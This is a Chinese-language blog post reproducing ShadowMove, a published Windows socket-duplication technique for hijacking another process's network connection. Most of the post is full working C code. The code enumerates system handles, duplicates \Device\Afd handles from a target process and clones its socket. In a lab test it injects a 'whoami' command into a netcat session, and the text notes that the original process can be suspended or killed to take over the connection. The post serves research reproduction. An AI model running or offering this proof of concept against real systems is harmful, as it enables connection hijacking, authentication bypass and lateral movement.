# ShadowMove复现与思考

## 简介

前段时间有几位老哥联名发了一篇论文，这篇论文描述了一种复制套接字劫持网络连接的技术，本文旨在于简单分析复现这种技术，如有错误欢迎指正。

作者给出的理论图如下，通过创建两个基于原套接字复制的套接字，定期挂起原套接字接收和响应特殊的数据包。

![](../.gitbook/assets/image%20%28206%29.png)

## 复现过程

尽管windows本身提供了WSADuplicateSocket函数，但是这个函数需要本地进程的socks句柄，而句柄只在本地进程才有意义，这篇文章的作者提出了一种从远程复制句柄技术的变体。

作者发现套接字的句柄等同于的名为\Device\Afd文件句柄，这个句柄可以直接视为socks使用\(虽然就是同一个，但说还是这么说\)，我们可以通过常规的句柄枚举技术从远程进程得到它，然后使用NtDuplicateObject函数将它复制到本地进程，本地进程再通过WSADuplicateSocket获取克隆套接字需要的参数，然后我们可以像使用自己的socket一样使用这个克隆过来的socket了。

![](../.gitbook/assets/image%20%28205%29.png)

在github有[0xcpu](https://github.com/0xcpu/winsmsd)师傅分享了一份ShadowMove的代码，这里我做了一点简化。

首先师傅获取了远程进程的所有句柄。

```text
    //获取远程线程内所有句柄
    pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)calloc(SystemInformationLength, sizeof(UCHAR));
    while (pNtQuerySystemInformation(SystemHandleInformation,
                                     pSysHandleInfo,
                                     SystemInformationLength,
                                     &ReturnLength) == STATUS_INFO_LENGTH_MISMATCH) {
        free(pSysHandleInfo);
        SystemInformationLength = ReturnLength;
        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)calloc(SystemInformationLength, sizeof(UCHAR));
    }

```

获取句柄之后将所有句柄克隆到了当前进程\(句柄只有在本地进程才有意义\)，对这个句柄的类型做了一个判断。\(这里我简单的做了一个优化，作者的源代码是判断所有句柄类型不等于0x28的句柄，其实所有\drivice\开头的文件句柄都是OB\_TYPE\_DEVICE, // 25,设备类型\)。

```text

    for (size_t i = 0; i < pSysHandleInfo->NumberOfHandles; i++) 
    {
        //句柄只在拥有者进程内有意义，所以这里需要通过NtDuplicateObject函数将句柄复制到当前进程
        if (pSysHandleInfo->Handles[i].ObjectTypeIndex == 0x25) {
            ntStatus = pNtDuplicateObject(hProcess,
                                          (HANDLE)pSysHandleInfo->Handles[i].HandleValue,
                                          GetCurrentProcess(),
                                          &TargetHandle,
                                          PROCESS_ALL_ACCESS, 
                                          FALSE,
                                          DUPLICATE_SAME_ACCESS);

            if (ntStatus == STATUS_SUCCESS) {
                pObjNameInfo = (POBJECT_NAME_INFORMATION)calloc(ObjectInformationLength, sizeof(UCHAR));

                if (NULL == pObjNameInfo) {
                    CloseHandle(TargetHandle);
                    free(pSysHandleInfo);
                    pSysHandleInfo = NULL;

                    return TargetSocket;
                }
```

随后比较简单的通过NtQueryObject函数查询句柄描述对象的部分属性，我们知道windows系统是对象驱动的，而在三环描述对象的是句柄，我们可以通过句柄查询一下句柄所描述对象的属性，这里查询了对象的设备描述符。

```text
    //查询指定句柄的部分属性，返回结果为OBJECT_NAME_INFORMATION的结构体
                while (pNtQueryObject(TargetHandle,
                                      (OBJECT_INFORMATION_CLASS)ObjectNameInformation,
                                      pObjNameInfo,
                                      ObjectInformationLength,
                                      &ReturnLength) == STATUS_INFO_LENGTH_MISMATCH)
                {
                    free(pObjNameInfo);
                    ObjectInformationLength = ReturnLength;
                    pObjNameInfo = (POBJECT_NAME_INFORMATION)calloc(ObjectInformationLength, sizeof(UCHAR));
                    if (NULL == pObjNameInfo) {
                        CloseHandle(TargetHandle);
                        free(pSysHandleInfo);
                        pSysHandleInfo = NULL;

                        return TargetSocket;
                    }
                }
                //判断句柄符号名是否为\\Device\\Afd，这个描述名的句柄等同于socks句柄
                if ((pObjNameInfo->Name.Length / 2) == wcslen(pcwDeviceAfd)) {
                    if ((wcsncmp(pObjNameInfo->Name.Buffer, pcwDeviceAfd, wcslen(pcwDeviceAfd)) == 0) &&//内存对比
                        IsTargetIPAndPort(TargetHandle, pIpAddress, dwPort)) { //如果这个句柄的对端地址和端口等同于输入，那就找到了。
```

最后这个师傅就直接开始复制套接字。

```text
       WsaErr = WSADuplicateSocketW((SOCKET)TargetHandle, GetCurrentProcessId(), &WsaProtocolInfo);
                        //返回一个用于创建共享套接字的结构体WSAPROTOCOL_INFOW。
                        if (WsaErr != 0) {
                            CloseHandle(TargetHandle);
                            free(pObjNameInfo);
                            free(pSysHandleInfo);
                            pSysHandleInfo = NULL;
                            pObjNameInfo = NULL;
                            return TargetSocket;
                        } else {
                            //通过获取的WSAPROTOCOL_INFOW结构体创建一个新的socks。
                            TargetSocket = WSASocket(WsaProtocolInfo.iAddressFamily,
                                                     WsaProtocolInfo.iSocketType,
                                                     WsaProtocolInfo.iProtocol,
                                                     &WsaProtocolInfo,
                                                     0,
                                                     WSA_FLAG_OVERLAPPED);
                            if (TargetSocket != INVALID_SOCKET) {
                                fwprintf(stdout, L"[OK] Socket was duplicated!\n");
                                CloseHandle(TargetHandle);
                                free(pObjNameInfo);
                                free(pSysHandleInfo);
                                pObjNameInfo = NULL;
                                pSysHandleInfo = NULL;

                                return TargetSocket;
                            }
                        }
                    }
                }

                CloseHandle(TargetHandle);
                free(pObjNameInfo);
                pObjNameInfo = NULL;
            }
        }
    }
```

## 完整代码

```text
#include "winsmsd.h"


BOOL Init(VOID)
{

    WSADATA WsaData;
  

     WSAStartup(MAKEWORD(2, 2), &WsaData);

    pNtDuplicateObject = (NTDUPLICATEOBJECT)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDuplicateObject");
    pNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
    pNtQueryObject = (NTQUERYOBJECT)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryObject");

    if (pNtDuplicateObject && pNtQuerySystemInformation && pNtQueryObject) {
        return TRUE;
    }
    else {
        WSACleanup();

        return FALSE;
    }
}


BOOL IsTargetIPAndPort(HANDLE hSocket, PBYTE TargetIp, USHORT TargetPort)
{
    INT         ret;
    SOCKADDR_IN SockAddr;
    INT         NameLen = sizeof(SOCKADDR_IN);

    ret = getpeername((SOCKET)hSocket, (PSOCKADDR)&SockAddr, &NameLen);
    if (ret != 0) {
        fwprintf(stderr, L"Failed to retrieve address of peer: %d\n", ret);
        return FALSE;
    } else {
        fwprintf(stdout, L"Address: %u.%u.%u.%u Port: %hu\n",
                 SockAddr.sin_addr.S_un.S_un_b.s_b1,
                 SockAddr.sin_addr.S_un.S_un_b.s_b2,
                 SockAddr.sin_addr.S_un.S_un_b.s_b3,
                 SockAddr.sin_addr.S_un.S_un_b.s_b4,
                 ntohs(SockAddr.sin_port));

        if (memcmp((PVOID)&SockAddr.sin_addr.S_un.S_un_b, (PVOID)TargetIp, 4) == 0 &&
            ntohs(SockAddr.sin_port) == TargetPort) {
            return TRUE;
        } else {
            return FALSE;
        }
    }
}

SOCKET GetSocket(HANDLE hProcess, PBYTE pIpAddress, USHORT dwPort)
{
    PSYSTEM_HANDLE_INFORMATION  pSysHandleInfo = NULL;
    POBJECT_NAME_INFORMATION    pObjNameInfo = NULL;
    ULONG                       SystemInformationLength = 0;
    ULONG                       ObjectInformationLength = 0;
    ULONG                       ReturnLength;
    HANDLE                      TargetHandle = INVALID_HANDLE_VALUE;
    SOCKET                      TargetSocket = INVALID_SOCKET;
    NTSTATUS                    ntStatus;
    PCWSTR                      pcwDeviceAfd = L"\\Device\\Afd";
    INT                         WsaErr;
    WSAPROTOCOL_INFOW           WsaProtocolInfo = { 0 };

    //获取远程线程内所有句柄
    pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)calloc(SystemInformationLength, sizeof(UCHAR));
    while (pNtQuerySystemInformation(SystemHandleInformation,
                                     pSysHandleInfo,
                                     SystemInformationLength,
                                     &ReturnLength) == STATUS_INFO_LENGTH_MISMATCH) {
        free(pSysHandleInfo);
        SystemInformationLength = ReturnLength;
        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)calloc(SystemInformationLength, sizeof(UCHAR));
    }

    for (size_t i = 0; i < pSysHandleInfo->NumberOfHandles; i++) 
    {
        //句柄只在拥有者进程内有意义，所以这里需要通过NtDuplicateObject函数将句柄复制到当前进程
        if (pSysHandleInfo->Handles[i].ObjectTypeIndex == 0x25) {
            ntStatus = pNtDuplicateObject(hProcess,
                                          (HANDLE)pSysHandleInfo->Handles[i].HandleValue,
                                          GetCurrentProcess(),
                                          &TargetHandle,
                                          PROCESS_ALL_ACCESS, 
                                          FALSE,
                                          DUPLICATE_SAME_ACCESS);

            if (ntStatus == STATUS_SUCCESS) {
                pObjNameInfo = (POBJECT_NAME_INFORMATION)calloc(ObjectInformationLength, sizeof(UCHAR));

                if (NULL == pObjNameInfo) {
                    CloseHandle(TargetHandle);
                    free(pSysHandleInfo);
                    pSysHandleInfo = NULL;

                    return TargetSocket;
                }
                //查询指定句柄的部分属性，返回结果为OBJECT_NAME_INFORMATION的结构体
                while (pNtQueryObject(TargetHandle,
                                      (OBJECT_INFORMATION_CLASS)ObjectNameInformation,
                                      pObjNameInfo,
                                      ObjectInformationLength,
                                      &ReturnLength) == STATUS_INFO_LENGTH_MISMATCH)
                {
                    free(pObjNameInfo);
                    ObjectInformationLength = ReturnLength;
                    pObjNameInfo = (POBJECT_NAME_INFORMATION)calloc(ObjectInformationLength, sizeof(UCHAR));
                    if (NULL == pObjNameInfo) {
                        CloseHandle(TargetHandle);
                        free(pSysHandleInfo);
                        pSysHandleInfo = NULL;

                        return TargetSocket;
                    }
                }
                //判断句柄符号名是否为\\Device\\Afd，这个描述名的句柄等同于socks句柄
                if ((pObjNameInfo->Name.Length / 2) == wcslen(pcwDeviceAfd)) {
                    if ((wcsncmp(pObjNameInfo->Name.Buffer, pcwDeviceAfd, wcslen(pcwDeviceAfd)) == 0) &&//内存对比
                        IsTargetIPAndPort(TargetHandle, pIpAddress, dwPort)) { //如果这个句柄的对端地址和端口等同于输入，那就找到了。
                        WsaErr = WSADuplicateSocketW((SOCKET)TargetHandle, GetCurrentProcessId(), &WsaProtocolInfo);
                        //返回一个用于创建共享套接字的结构体WSAPROTOCOL_INFOW。
                        if (WsaErr != 0) {
                            CloseHandle(TargetHandle);
                            free(pObjNameInfo);
                            free(pSysHandleInfo);
                            pSysHandleInfo = NULL;
                            pObjNameInfo = NULL;
                            return TargetSocket;
                        } else {
                            //通过获取的WSAPROTOCOL_INFOW结构体创建一个新的socks。
                            TargetSocket = WSASocket(WsaProtocolInfo.iAddressFamily,
                                                     WsaProtocolInfo.iSocketType,
                                                     WsaProtocolInfo.iProtocol,
                                                     &WsaProtocolInfo,
                                                     0,
                                                     WSA_FLAG_OVERLAPPED);
                            if (TargetSocket != INVALID_SOCKET) {
                                fwprintf(stdout, L"[OK] Socket was duplicated!\n");
                                CloseHandle(TargetHandle);
                                free(pObjNameInfo);
                                free(pSysHandleInfo);
                                pObjNameInfo = NULL;
                                pSysHandleInfo = NULL;

                                return TargetSocket;
                            }
                        }
                    }
                }

                CloseHandle(TargetHandle);
                free(pObjNameInfo);
                pObjNameInfo = NULL;
            }
        }
    }

    free(pSysHandleInfo);
    
    return TargetSocket;
}



DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    Sleep(3000);
    char msg[] = "whoami";
    send((SOCKET)lpParam, msg, sizeof(msg), MSG_OOB);
    return 0;
}

int main(int argc, char** argv)
{
    DWORD   dwPid;
    USHORT  uPort;
    BYTE    IpAddress[4] = { 0 };
    HANDLE  hProc;
    PCHAR   pToken = NULL;
    PCHAR   Ptr;
    SIZE_T  i = 0;


    Init();

    dwPid = strtoul(argv[1], NULL, 10);
    uPort = (USHORT)strtoul(argv[3], NULL, 10);
    pToken = strtok_s(argv[2], ".", &Ptr);
    while (pToken && i < 4) {
        IpAddress[i] = (BYTE)strtoul(pToken, NULL, 10);
        pToken = strtok_s(NULL, ".", &Ptr);
        i++;
    }

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof pe;

    if (Process32First(hSnapshot, &pe))
    {
        do {
            if (lstrcmpi(L"nc64.exe", pe.szExeFile) == 0)
            {
                CloseHandle(hSnapshot);
                dwPid=  pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    

    hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwPid);


    BYTE Buff[128] = { 0 };
    SOCKET NewSocket = GetSocket(hProc, IpAddress, uPort);
    
    HANDLE hTHread =  CreateThread(0, 0, ThreadProc, NewSocket, 0, 0);

    if (NewSocket != INVALID_SOCKET) {
        while (recv(NewSocket, Buff, 128, MSG_PEEK) == -1);
        printf("%s", Buff);

        closesocket(NewSocket);
    }
    CloseHandle(hProc);
    CloseHandle(hSnapshot);
    WSACleanup();
    return 0;
}

```

## 复现和思考

这种技术理论上只能应用于明文传输的协议，如Telnet、ftp，劫持连接后我们通常能直接掠过身份认证的过程，这里我们起一个nc的bash控制口做一个测试。

我们先在kali上起一个服务端，然后使用nc去连接。

![](../.gitbook/assets/image%20%28208%29.png)

![](../.gitbook/assets/image%20%28207%29.png)

之后运行我们的poc，由于套接字的处理是异步的，我们需要另起一个线程去发送命令，然后使用主线程接收。

```text
DWORD WINAPI ThreadProc(LPVOID lpParam)
{
    Sleep(3000);
    char msg[] = "whoami";
    send((SOCKET)lpParam, msg, sizeof(msg), MSG_OOB);
    return 0;
}

 HANDLE hTHread =  CreateThread(0, 0, ThreadProc, NewSocket, 0, 0);
```

可以看到主副socket都接收到了命令的结果，如果我们不想要主套接字接收到，我们可以直接挂起或者干掉它来接管这个网络连接。

![](../.gitbook/assets/image%20%28209%29.png)

## LINKS

{% embed url="https://github.com/0xcpu/winsmsd" %}



原文如下:

{% embed url="https://www.usenix.org/system/files/sec20summer\_niakanlahiji\_prepub.pdf" %}







